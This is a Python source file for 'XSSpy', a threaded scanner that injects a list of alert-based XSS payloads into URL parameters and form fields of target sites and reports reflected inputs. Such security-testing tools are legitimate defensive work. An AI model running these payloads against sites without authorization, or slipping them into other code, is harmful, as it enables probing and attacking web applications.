#!/usr/bin/env python3
"""
XSSpy - Simple XSS Automation Tool
Created for educational and authorized testing purposes only
"""

import requests
import argparse
import sys
import time
import os
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
from queue import Queue

# Enhanced Banner with Logo
def show_banner():
    banner = """
    ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
    ║╔═╗║║╔══╝║╔══╝║╔═╗║║╔══╝
    ║╚═╝║║╚══╗║╚══╗║╚═╝║║╚══╗
    ║╔══╝║╔══╝║╔══╝║╔╗╔╝║╔══╝
    ║║   ║╚══╗║╚══╗║║║╚╗║╚══╗
    ╚╝   ╚═══╝╚═══╝╚╝╚═╝╚═══╝
    
    ██╗  ██╗███████╗███████╗██████╗ ██████╗ ██╗   ██╗
    ╚██╗██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
     ╚███╔╝ ███████╗███████╗██████╔╝██████╔╝ ╚████╔╝ 
     ██╔██╗ ╚════██║╚════██║██╔═══╝ ██╔══██╗  ╚██╔╝  
    ██╔╝ ██╗███████║███████║██║     ██║  ██║   ██║   
    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝   ╚═╝   
    
    [+] XSS Automation & Detection Tool
    [+] Version: 2.0
    [+] Author: Security Researcher
    [+] Purpose: Educational & Authorized Testing Only
    """
    print(banner)

# Default XSS payloads
DEFAULT_PAYLOADS = [
    "<script>alert('XSSpy')</script>",
    "<img src=x onerror=alert('XSSpy')>",
    "<svg onload=alert('XSSpy')>",
    "'\"><script>alert('XSSpy')</script>",
    "<body onload=alert('XSSpy')>",
    "<iframe src=\"javascript:alert('XSSpy')\">",
    "<a href=\"javascript:alert('XSSpy')\">click</a>",
    "<div onmouseover=alert('XSSpy')>hover</div>",
    "<input type=\"text\" value=\"<script>alert('XSSpy')</script>\">",
    "<details open ontoggle=alert('XSSpy')>",
    "<video><source onerror=alert('XSSpy')>",
    "<audio src=x onerror=alert('XSSpy')>",
    "<form><button formaction=javascript:alert('XSSpy')>submit</button>",
    "<math href=\"javascript:alert('XSSpy')\">CLICK</math>",
    "<link rel=stylesheet href=\"javascript:alert('XSSpy')\">"
]

def load_custom_payloads(payload_file):
    """Load custom payloads from file"""
    custom_payloads = []
    try:
        with open(payload_file, 'r', encoding='utf-8') as f:
            for line in f:
                payload = line.strip()
                if payload and not payload.startswith('#'):  # Skip empty lines and comments
                    custom_payloads.append(payload)
        print(f"[+] Loaded {len(custom_payloads)} custom payloads from {payload_file}")
        return custom_payloads
    except FileNotFoundError:
        print(f"[-] Payload file not found: {payload_file}")
        return []
    except Exception as e:
        print(f"[-] Error loading payload file: {e}")
        return []

class XSSScanner:
    def __init__(self, target_url, threads=5, timeout=10, payloads=None):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.found_xss = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (XSSpy-Scanner/2.0)'
        })
        
        # Use custom payloads if provided, else default
        self.payloads = payloads if payloads else DEFAULT_PAYLOADS
        print(f"[*] Using {len(self.payloads)} payloads for testing")

    def extract_forms(self, url):
        """Extract all forms from the webpage"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error extracting forms from {url}: {e}")
            return []

    def get_form_details(self, form):
        """Extract form details"""
        details = {}
        details['action'] = form.get('action')
        details['method'] = form.get('method', 'get').lower()
        details['inputs'] = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            if input_name:
                details['inputs'].append({'type': input_type, 'name': input_name})
        
        # Also include textarea and select elements
        for textarea in form.find_all('textarea'):
            textarea_name = textarea.get('name')
            if textarea_name:
                details['inputs'].append({'type': 'textarea', 'name': textarea_name})
                
        for select in form.find_all('select'):
            select_name = select.get('name')
            if select_name:
                details['inputs'].append({'type': 'select', 'name': select_name})
        
        return details

    def test_xss_url(self, url):
        """Test XSS in URL parameters"""
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed.query)
        
        for param in params:
            for payload in self.payloads:
                try:
                    # URL encode the payload for GET parameters
                    from urllib.parse import quote
                    encoded_payload = quote(payload)
                    
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={encoded_payload}")
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if payload in response.text:
                        self.found_xss.append({
                            'type': 'URL',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url
                        })
                        print(f"[+] XSS Found in URL parameter: {param}")
                        return True
                except Exception as e:
                    continue
        return False

    def test_xss_form(self, form_details, url):
        """Test XSS in forms"""
        target_url = urljoin(url, form_details['action'])
        
        for payload in self.payloads:
            try:
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['type'] in ['hidden', 'submit']:
                        data[input_tag['name']] = input_tag.get('value', '')
                    else:
                        data[input_tag['name']] = payload

                if form_details['method'] == 'post':
                    response = self.session.post(target_url, data=data, timeout=self.timeout)
                else:
                    response = self.session.get(target_url, params=data, timeout=self.timeout)

                if payload in response.text:
                    self.found_xss.append({
                        'type': 'FORM',
                        'parameter': ', '.join(data.keys()),
                        'payload': payload,
                        'url': target_url
                    })
                    print(f"[+] XSS Found in FORM: {target_url}")
                    return True
            except Exception as e:
                continue
        return False

    def scan_url(self, url):
        """Main scanning function for a URL"""
        print(f"[*] Scanning: {url}")
        
        # Test URL parameters
        url_tested = self.test_xss_url(url)
        
        # Test forms
        forms = self.extract_forms(url)
        print(f"[*] Found {len(forms)} forms on {url}")
        
        for form in forms:
            form_details = self.get_form_details(form)
            self.test_xss_form(form_details, url)

    def worker(self):
        """Worker thread for scanning"""
        while True:
            url = self.url_queue.get()
            if url is None:
                break
            self.scan_url(url)
            self.url_queue.task_done()

    def scan(self, urls):
        """Start scanning multiple URLs"""
        self.url_queue = Queue()
        
        # Add URLs to queue
        for url in urls:
            self.url_queue.put(url)
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        
        # Add poison pills to stop workers
        for _ in range(self.threads):
            self.url_queue.put(None)
        
        # Wait for all threads to complete
        self.url_queue.join()
        
        for t in threads:
            t.join()

    def generate_report(self):
        """Generate scan report"""
        print("\n" + "="*60)
        print("XSSpy SCAN REPORT")
        print("="*60)
        
        if self.found_xss:
            print(f"[+] Found {len(self.found_xss)} potential XSS vulnerabilities!")
            for i, xss in enumerate(self.found_xss, 1):
                print(f"\n{i}. Type: {xss['type']}")
                print(f"   Parameter: {xss['parameter']}")
                print(f"   Payload: {xss['payload']}")
                print(f"   URL: {xss['url']}")
        else:
            print("[-] No XSS vulnerabilities found.")
        print("="*60)

def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='XSSpy - XSS Automation Tool')
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of URLs to scan')
    parser.add_argument('-p', '--payloads', help='File containing custom XSS payloads')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-o', '--output', help='Output file to save results')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    # Load payloads
    if args.payloads:
        payloads = load_custom_payloads(args.payloads)
        if not payloads:
            print("[!] No custom payloads loaded, using default payloads")
            payloads = DEFAULT_PAYLOADS
    else:
        payloads = DEFAULT_PAYLOADS
        print("[*] Using default payloads")
    
    urls = []
    
    if args.url:
        urls.append(args.url)
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"[-] File not found: {args.file}")
            sys.exit(1)
    
    print(f"[*] Starting XSSpy scan with {args.threads} threads")
    print(f"[*] Target URLs: {len(urls)}")
    print(f"[*] Payloads: {len(payloads)}")
    print("[*] Scan started at: " + time.strftime("%Y-%m-%d %H:%M:%S"))
    print("-" * 60)
    
    scanner = XSSScanner(
        target_url=urls[0] if urls else "", 
        threads=args.threads, 
        timeout=args.timeout,
        payloads=payloads
    )
    scanner.scan(urls)
    
    scanner.generate_report()
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write("XSSpy Scan Report\n")
            f.write("="*50 + "\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Targets Scanned: {len(urls)}\n")
            f.write(f"Payloads Used: {len(payloads)}\n")
            f.write(f"Vulnerabilities Found: {len(scanner.found_xss)}\n")
            f.write("="*50 + "\n\n")
            
            for i, xss in enumerate(scanner.found_xss, 1):
                f.write(f"Vulnerability {i}:\n")
                f.write(f"Type: {xss['type']}\n")
                f.write(f"Parameter: {xss['parameter']}\n")
                f.write(f"Payload: {xss['payload']}\n")
                f.write(f"URL: {xss['url']}\n")
                f.write("-"*50 + "\n")
        print(f"[+] Report saved to: {args.output}")

if __name__ == "__main__":
    main()